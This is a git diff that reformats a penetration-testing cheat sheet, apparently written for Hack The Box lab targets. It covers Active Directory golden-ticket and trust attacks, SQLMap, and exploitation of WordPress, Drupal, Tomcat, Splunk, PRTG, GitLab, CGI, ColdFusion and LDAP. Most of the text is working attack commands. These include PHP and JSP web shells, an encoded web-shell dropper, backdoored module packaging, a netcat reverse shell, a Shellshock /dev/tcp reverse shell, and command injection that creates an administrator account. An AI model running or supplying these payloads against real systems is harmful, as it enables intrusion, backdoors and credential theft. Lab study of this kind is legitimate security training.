+# Domain SID
 lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
 lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
-
-# Grabbing the Domain SID & Attaching to Enterprise Admin's RID
 lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
 
-# Constructing a Golden Ticket using ticketer.py
-ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
-
-# Setting the KRB5CCNAME Environment Variable
+# Golden ticket
+ticketer.py -nthash <KRBTGT_HASH> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <CHILD_DOMAIN_SID> -extra-sid <ENTERPRISE_ADMINS_SID> hacker
 export KRB5CCNAME=hacker.ccache
 
-# Getting a SYSTEM shell using Impacket's psexec.py
+# SYSTEM shell
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
 
-# Performing the Attack with raiseChild.py
+# Automated
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
-
 ```
 
-##### Trust Relationships - Cross-Forest
-```
-# PowerView tool used to enumerate accounts for associated SPNs from a Windows-based host.
+### Cross-Forest Trusts
+
+#### From Windows
+
+```powershell
 Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
-
-# PowerView tool used to enumerate the mssqlsvc account from a Windows-based host.
 Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
 
-# Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+# Kerberoast across the trust
 .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
 
-# PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.
+# Foreign group membership
 Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
-Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
+Convert-SidToName <ROOT_DOMAIN_ADMIN_SID>
 
-# PowerShell cmd-let used to remotely connect to a target Windows FREIGHTLOGISTICS.LOCAL system from a Windows-based host.
+# Remote session
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+```
 
-#################################################################################################################
-#### Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+#### From Linux
+
+```bash
 GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
 GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
 
-# Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
+Point DNS at the target domain before enumerating:
+
+```bash
+# Add INLANEFREIGHT.LOCAL to /etc/resolv.conf
 cat /etc/resolv.conf
 #nameserver 1.1.1.1
 #nameserver 8.8.8.8
 domain INLANEFREIGHT.LOCAL
 nameserver 172.16.5.5
 
-# Running bloodhound-python Against INLANEFREIGHT.LOCAL
-bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p '<PASSWORD>'
 zip -r ilfreight_bh.zip *.json
 
-# Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
+# Add FREIGHTLOGISTICS.LOCAL to /etc/resolv.conf
+cat /etc/resolv.conf
 #nameserver 1.1.1.1
 #nameserver 8.8.8.8
 domain FREIGHTLOGISTICS.LOCAL
 nameserver 172.16.5.238
 
-# Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
-bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
-
+bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p '<PASSWORD>'
 ```
 
-## Login Brute Forcing
+## 11. SQLMap
 
-##### Hydra
-```
-# Basic Auth Brute Force - User/Pass Wordlists
-hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
-
-# Login Form Brute Force - Static User, Pass Wordlist
-hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
-```
-
-## SQLMap
 ```
 # Run SQLMap without asking for user input
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
 
-# SQLMap with POST request specifying an unjection point with asterisk
+# SQLMap with POST request specifying an injection point with asterisk
 sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
 
 # Passing an HTTP request file to SQLMap
@@ -2201,7 +2603,7 @@ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surna
 sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
 
 # CSRF token bypass
-sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
+sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=<CSRF_TOKEN>" --csrf-token="csrf-token"
 
 # List all tamper scripts
 sqlmap --list-tampers
@@ -2212,59 +2614,68 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 # Spawn a shell
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
-## Attacking Common Applications
-### Application - Enumeration
+
+## 12. Attacking Common Web Applications
+
+### Application Enumeration
+
 ```
 - nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
 - eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
 - cat web_discovery.xml | ./aquatone -nmap
 
 ```
+
 ### WordPress
+
 ```
 - curl -s http://blog.inlanefreight.local | grep WordPress
 - curl -s http://blog.inlanefreight.local/ | grep themes
 - curl -s http://blog.inlanefreight.local/ | grep plugins
 - curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
 - http://blog.inlanefreight.local/wp-login.php
-- sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
+- sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <WPSCAN_API_TOKEN>
 - wpscan --url http://blog.inlanefreight.local/
 - user enum
-	-->  wpscan --url http://blog.inlanefreight.local --enumerate u
+	-  wpscan --url http://blog.inlanefreight.local --enumerate u
 -  Brute force
-	-->  sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+	-  sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 - Command injection or Code Execution
-	--> login with admin --> http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
-	--> update file --> system($_GET[0]);
-	--> curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+	- login with admin --> http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen
+	- update file --> system($_GET[0]);
+	- curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 - mfs
-	--> use exploit/unix/webapp/wp_admin_shell_upload
+	- use exploit/unix/webapp/wp_admin_shell_upload
 - Vulnerable Plugins - mail-masta
-	--> curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
+	- curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 - Vulnerable Plugins - wpDiscuz
-	--> python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+	- python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
 - curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
 ```
+
 ### Joomla
-```
---> curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
---> curl -s http://dev.inlanefreight.local/ | grep Joomla
---> curl -s http://dev.inlanefreight.local/README.txt | head -n 5
---> curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
---> sudo pip3 install droopescan
-	--> droopescan scan joomla --url http://dev.inlanefreight.local/
-
--->  python2 -m pip install bs4
-	--> python2 joomlascan.py -u http://dev.inlanefreight.local
-	--> sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
---> 
-	--> curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
---> CVE-2019-10945
-	--> https://github.com/dpgg101/CVE-2019-10945
-	--> python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
 
 ```
+- curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
+- curl -s http://dev.inlanefreight.local/ | grep Joomla
+- curl -s http://dev.inlanefreight.local/README.txt | head -n 5
+- curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
+- sudo pip3 install droopescan
+	- droopescan scan joomla --url http://dev.inlanefreight.local/
+
+-  python2 -m pip install bs4
+	- python2 joomlascan.py -u http://dev.inlanefreight.local
+	- sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+
+	- curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+- CVE-2019-10945
+	- https://github.com/dpgg101/CVE-2019-10945
+	- python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username <USER> --password <PASSWORD> --dir /
+
+```
+
 ### Drupal
+
 ```
 - curl -s http://drupal.inlanefreight.local | grep Drupal
 - curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
@@ -2273,61 +2684,61 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 - https://www.cvedetails.com/vulnerability-list/vendor_id-1367/product_id-2387/Drupal-Drupal.html
 
 - Leveraging the PHP Filter Module
-	--> log in as an admin and enable the PHP filter module --> check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.
-	--> create a page with a malicious PHP snippet system($_GET['cmd']);  We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to 	an attacker during our assessment.
-	--> set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3.
-	--> curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
-	
+	- log in as an admin and enable the PHP filter module --> check box next to the module and scroll down to Save configuration. Next, we could go to Content --> Add content and create a Basic page.
+	- create a page with a malicious PHP snippet system($_GET['cmd']);  We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to 	an attacker during our assessment.
+	- set Text format drop-down to PHP code. After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3.
+	- curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
+
 - Leveraging the PHP Filter Module (version 8 )
-	--> wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
-	--> Once downloaded go to Administration > Reports > Available updates. http://drupal.inlanefreight.local/admin/reports/updates/install
-	--> Browse, select the file from the directory we downloaded it to, and then click Install.
-	--> Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.
+	- wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
+	- Once downloaded go to Administration > Reports > Available updates. http://drupal.inlanefreight.local/admin/reports/updates/install
+	- Browse, select the file from the directory we downloaded it to, and then click Install.
+	- Once the module is installed, we can click on Content and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select PHP code from the Text format dropdown.
 
 - Uploading a Backdoored Module
-	--> Download the archive and extract its contents.
-	--> get --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
-	--> tar xvf captcha-8.x-1.2.tar.gz
-	--> Create a PHP web shell with the contents:
+	- Download the archive and extract its contents.
+	- get --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
+	- tar xvf captcha-8.x-1.2.tar.gz
+	- Create a PHP web shell with the contents:
 		<?php
 		system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
 		?>
-	--> Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
+	- Next, we need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder.
 		<IfModule mod_rewrite.c>
 		RewriteEngine On
 		RewriteBase /
 		</IfModule>
-	--> The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
+	- The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive.
 		- mv shell.php .htaccess captcha
 		- tar cvf captcha.tar.gz captcha/
-		- ssuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, 			such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.
+		- Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, 			such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install.
 		- curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
 
 - Leveraging Known Vulnerabilities
 	- Drupalgeddon
-		--> POC:- https://www.exploit-db.com/exploits/34992
-		--> python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
-		--> Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.
-		--> We could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.
+		- POC:- https://www.exploit-db.com/exploits/34992
+		- python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p <PASSWORD>
+		- Now let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously in this section.
+		- We could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this.
 	- Drupalgeddon2
-		--> POC:- https://www.exploit-db.com/exploits/44448
-		--> python3 drupalgeddon2.py
-		--> curl -s http://drupal-dev.inlanefreight.local/hello.txt
-		--> Now let's modify the script to gain remote code execution by uploading a malicious PHP file.
+		- POC:- https://www.exploit-db.com/exploits/44448
+		- python3 drupalgeddon2.py
+		- curl -s http://drupal-dev.inlanefreight.local/hello.txt
+		- Now let's modify the script to gain remote code execution by uploading a malicious PHP file.
 			<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>
-		--> echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
-		--> echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
-		--> run the modified exploit script to upload our malicious PHP file.
-		--> python3 drupalgeddon2.py
-		--> curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
+		- echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64
+		- echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
+		- run the modified exploit script to upload our malicious PHP file.
+		- python3 drupalgeddon2.py
+		- curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
 	-Drupalgeddon3
-		--> POC:- https://github.com/rithchard/Drupalgeddon3
-		--> Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this 		using Metasploit, but we must first log in and obtain a valid session cookie.
-		--> Once we have the session cookie, we can set up the exploit module as follows.
+		- POC:- https://github.com/rithchard/Drupalgeddon3
+		- Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this 		using Metasploit, but we must first log in and obtain a valid session cookie.
+		- Once we have the session cookie, we can set up the exploit module as follows.
 			- multi/http/drupal_drupageddon3
 			- set rhosts 10.129.42.195
 			- set VHOST drupal-acc.inlanefreight.local
-			- set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
+			- set drupal_session SESS<ID>=<SESSION_VALUE>
 			- set DRUPAL_NODE 1
 			- set LHOST 10.10.14.15
 			- show options
@@ -2335,178 +2746,196 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 			- meterpreter > getuid
 
 ```
+
 ### Tomcat
-```
---> gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
--->  hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -s 8180 app-dev.inlanefreight.local http-get /manager/html
---> msf6 auxiliary(scanner/http/tomcat_mgr_login)
-
---> WEB SHELL IN TOMCAT
-	--> wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
-	--> zip -r backup.war cmd.jsp
-	OR --> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
-	--> curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
-
---> Ghostcat
-	--> https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
-	--> python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
 
 ```
+- gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+-  hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -s 8180 app-dev.inlanefreight.local http-get /manager/html
+- msf6 auxiliary(scanner/http/tomcat_mgr_login)
+
+- WEB SHELL IN TOMCAT
+	- wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+	- zip -r backup.war cmd.jsp
+	# OR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+	- curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+
+- Ghostcat
+	- https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
+	- python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
+
+```
+
 ### Splunk
+
 ```
---> The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are admin:changeme
---> The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication
---> https://github.com/0xjpuff/reverse_shell_splunk
---> sword0x00@htb[/htb]$ tree splunk_shell/
+- The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are <DEFAULT_CREDS>
+- The Splunk Enterprise trial converts to a free version after 60 days, which doesn't require authentication
+- https://github.com/0xjpuff/reverse_shell_splunk
+- user@htb[/htb]$ tree splunk_shell/
 	splunk_shell/
 	├── bin
 	└── default
---> We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
+- We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
 	@ECHO OFF
 	PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
 	Exit
---> Once the files are created, we can create a tarball or .spl file.
-	sword0x00@htb[/htb]$ tar -cvzf updater.tar.gz reverse_shell_splunk/
---> The next step is to choose Install app from file and upload the application.
+- Once the files are created, we can create a tarball or .spl file.
+	user@htb[/htb]$ tar -cvzf updater.tar.gz reverse_shell_splunk/
+- The next step is to choose Install app from file and upload the application.
 	https://10.129.201.50:8000/en-US/manager/search/apps/local
---> Before uploading the malicious custom app, let's start a listener using Netcat or socat.
-	sword0x00@htb[/htb]$ sudo nc -lnvp 443
+- Before uploading the malicious custom app, let's start a listener using Netcat or socat.
+	user@htb[/htb]$ sudo nc -lnvp 443
 ```
+
 ### PRTG
+
 ```
---> curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
---> Default credentials prtgadmin:prtgadmin
---> try brute force
---> check CVEs for older versions
---> check command injection via https://www.codewatch.org/blog/?p=453
-	--> Setup in the top right and then the Account Settings menu and finally click on Notifications.
-	--> Add new notification. -> next to EXECUTE PROGRAM. Under Program File, select Demo exe notification - outfile.ps1
-	--> in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add --> Save
-	--> Notifications -->  see our new notification named pwn in the list. --> After clicking Test we will get a pop-up that says EXE notification is queued up.
-	--> Since this is a blind command execution, we need check by crackmap or impacktools
-	--> sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
-	--> impacket-psexec APP03/prtgadm1:'Pwn3d_by_PRTG!'@10.129.201.50
-	
+- curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
+- Default credentials <DEFAULT_CREDS>
+- try brute force
+- check CVEs for older versions
+- check command injection via https://www.codewatch.org/blog/?p=453
+	- Setup in the top right and then the Account Settings menu and finally click on Notifications.
+	- Add new notification. -> next to EXECUTE PROGRAM. Under Program File, select Demo exe notification - outfile.ps1
+	- in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering test.txt;net user prtgadm1 <NEW_PASSWORD> /add;net localgroup administrators prtgadm1 /add --> Save
+	- Notifications -->  see our new notification named pwn in the list. --> After clicking Test we will get a pop-up that says EXE notification is queued up.
+	- Since this is a blind command execution, we need check by crackmap or impacktools
+	- sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p <NEW_PASSWORD>
+	- impacket-psexec APP03/prtgadm1:'<NEW_PASSWORD>'@10.129.201.50
+
 ```
-### GITLAB
+
+### GitLab
+
 ```
---> https://www.exploit-db.com/exploits/49821
-	--> ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt	
---> https://www.exploit-db.com/exploits/49951
-	--> python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+- https://www.exploit-db.com/exploits/49821
+	- ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
+- https://www.exploit-db.com/exploits/49951
+	- python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p <PASSWORD> -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
 ```
+
 ### CGI
+
 ```
---> fuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
---> sword0x00@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
---> gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
---> try command injection
+- ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+- user@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+- gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+- try command injection
 	- http://10.129.204.227:8080/cgi/welcome.bat?&dir
 	- http://10.129.204.227:8080/cgi/welcome.bat?&set
 	- http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
-	-http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+	- http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
 
---> curl -i http://10.129.204.231/cgi-bin/access.cgi
+- curl -i http://10.129.204.231/cgi-bin/access.cgi
 	- curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.205.27/cgi-bin/access.cgi
 	- curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.15.38/7777 0>&1' http://10.129.205.27/cgi-bin/access.cgi
 	- sudo nc -lvnp 7777
 ```
-### ColdFusion
-```
---> nmap -p- -sC -Pn 10.129.247.30 --open --> 8500/tcp  open  fmtp which is clodfusion ssl default port
---> To know the version --> /CFIDE/administrator
 
---> Attacking ColdFusion
-	--> searchsploit adobe coldfusion
-		--> Directory Traversal
+### ColdFusion
+
+```
+- nmap -p- -sC -Pn 10.129.247.30 --open --> 8500/tcp open fmtp (ColdFusion SSL default port)
+- To know the version --> /CFIDE/administrator
+
+- Attacking ColdFusion
+	- searchsploit adobe coldfusion
+		- Directory Traversal
 			1) http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en OR http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
 			OR
 			2) searchsploit -p 14641
-				--> cp /usr/share/exploitdb/exploits/multiple/remote/14641.py
-				--> python2 14641.py
-				--> python2 14641.py 10.129.204.230 8500
-		--> RCE
+				- cp /usr/share/exploitdb/exploits/multiple/remote/14641.py
+				- python2 14641.py
+				- python2 14641.py 10.129.204.230 8500
+		- RCE
 			1) http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
 			OR
 			2) http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
 			OR
 			3) searchsploit -p 50057
-				--> cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
-				--> python3 50057.py 
-			
+				- cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+				- python3 50057.py
 
 ```
+
 ### IIS Tilde Enumeration
-```
---> nmap -p- -sV -sC --open 10.129.224.91 --> _http-server-header: Microsoft-IIS/7.5 which is iis service are working
---> Install IIS-shortname-scanner from here https://github.com/irsdl/IIS-ShortName-Scanner ,, also you will find how to install oracle java https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/
--->  java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
---> Generate Wordlist that start with transf
-	--> egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
-	--> gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
 
 ```
-### LDAP
+- nmap -p- -sV -sC --open 10.129.224.91 --> _http-server-header: Microsoft-IIS/7.5 which is IIS is running
+- Install IIS-shortname-scanner from here https://github.com/irsdl/IIS-ShortName-Scanner , also you will find how to install oracle java https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/
+-  java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
+- Generate a wordlist starting with `transf`
+	- egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
+	- gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
+
 ```
---> nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
+
+### LDAP
+
+```
+- nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
 
 # ldapsearch:- ldapsearch is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service.
-	--> ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
+	- ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w <PASSWORD> -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
 
 # LDAP Injection by using * in username field OR by using * in password field
 	$username = "*";
 	$password = "dummy";
 	(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
 
-OR
+# OR
 	$username = "dummy";
 	$password = "*";
 	(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
 
-OR
+# OR
 	$username = "*"
 	$password ="*"
 ```
+
 ### Jenkins
+
 ```
-1) Default Cred
+1) Default credentials
 2) Bruteforce
 3) Script Console
-	--> http://jenkins.inlanefreight.local:8000/script
-	-->
-		def cmd = 'id'
+	- http://jenkins.inlanefreight.local:8000/script
